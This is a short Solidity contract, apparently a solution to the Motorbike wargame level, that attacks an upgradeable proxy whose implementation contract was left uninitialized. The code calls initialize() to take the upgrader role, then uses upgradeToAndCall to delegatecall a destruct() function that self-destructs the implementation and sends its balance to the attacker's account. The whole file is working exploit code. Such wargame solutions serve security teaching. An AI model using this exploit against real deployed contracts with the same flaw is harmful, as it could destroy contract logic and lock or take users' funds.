// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract MotorbikeAttack7702 {
    
    // Called from delegated EOA -> main EOA -> here (attacker logic)
    function attack(address _engineAddress, address _attackerContract, address _mainEoa) public {
        // Step 1: Initialize to become upgrader
        IEngine(_engineAddress).initialize();

        // 2. Prepare payload to call destruct()
        bytes memory payload = abi.encodeWithSignature("destruct(address)", _mainEoa);

        // 3. Upgrade to THIS contract, and delegatecall destruct()
        IEngine(_engineAddress).upgradeToAndCall(_attackerContract, payload);
    }

    // Will be executed via delegatecall by Engine
    function destruct(address _mainEoa) external {
        selfdestruct(payable(_mainEoa));
    }
}
